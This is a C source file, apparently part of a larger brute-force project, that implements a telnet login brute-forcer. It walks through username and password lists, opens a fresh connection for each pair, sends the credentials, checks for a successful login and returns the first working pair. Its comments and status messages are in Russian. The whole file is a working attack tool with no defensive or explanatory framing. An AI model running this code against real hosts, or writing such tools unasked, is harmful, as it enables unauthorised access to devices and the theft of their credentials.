#include "include/includes.h"
#include "bruteforce_functions/wait_for_prompt.c"
#include "bruteforce_functions/socket_things.c"
#include "bruteforce_functions/login_things.c"

Credentials telnet_login(const char *host) {
    static Credentials result;
    char buffer[TELNET_MAX_BUFFER];
    int sock;
    struct sockaddr_in server;

    printf("Пытаемся войти на %s...\n", host);

    for (const char **username = usernames; *username != NULL; username++) {
        for (const char **password = passwords; *password != NULL; password++) {
            // Открываем новое соединение для каждой попытки
            sock = create_socket(host, &server);
            if (sock < 0) {
                printf("Не удалось установить соединение\n");
                continue;
            }

            printf("Соединение установлено\n");

            if (!wait_for_prompt(sock)) {
                close_socket(sock, "");
                continue;
            }

            printf("Пытаемся войти с %s\n", *username);
            sleep(3);
            send_username(sock, *username);

            if (!wait_for_prompt(sock)) {
                close_socket(sock, "");
                continue;
            }

            printf("Пытаемся войти с паролем %s\n", *password);
            sleep(0.5);
            send_password(sock, *password);

            printf("Подождали. Проверяем успешность входа\n");
            sleep(1);
            if (check_login_success(sock, buffer)) {
                strncpy(result.username, *username, sizeof(result.username) - 1);
                strncpy(result.password, *password, sizeof(result.password) - 1);
                result.username[sizeof(result.username) - 1] = '\0'; // Обеспечиваем нуль-терминацию
                result.password[sizeof(result.password) - 1] = '\0'; // Обеспечиваем нуль-терминацию
                result.good = 1;
                close_socket(sock, "");
                return result;
            }

            // Закрываем соединение после каждой попытки
            close_socket(sock, "");
        }
    }

    // Если вход не удался, возвращаем пустые строки
    result.username[0] = '\0';
    result.password[0] = '\0';
    result.good = 0;
    return result;
}

Credentials telnet_brute(char *host) {
    Credentials credentials = telnet_login(host);
    
    if (credentials.username[0] != '\0' && credentials.password[0] != '\0') {
        printf("Успешный вход: %s:%s\n", credentials.username, credentials.password);
    } else {
        printf("Не удалось войти на %s\n", host);
    }

    return credentials;
}